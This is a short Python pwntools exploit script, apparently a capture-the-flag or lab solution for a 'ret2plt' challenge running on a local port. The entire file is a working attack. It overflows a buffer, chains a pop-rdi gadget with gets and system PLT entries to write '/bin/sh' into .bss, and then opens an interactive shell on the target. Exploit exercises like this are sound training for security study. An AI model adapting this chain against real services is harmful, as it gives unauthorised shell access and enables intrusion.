from pwn import *

# r = process('../ret2plt/share/ret2plt')
r = remote('127.0.0.1', 10007)

pop_rdi = 0x000000000040115a
gets_plt = 0x401050
system_plt = 0x401030
bss = 0x404f00

payload = b"A" * (0x10 + 0x8) + p64(pop_rdi) + p64(bss) + p64(gets_plt) + p64(pop_rdi) + p64(bss) + p64(system_plt)

r.sendlineafter(b"Leave a message: ", payload)
r.sendline(b"/bin/sh")
r.interactive()
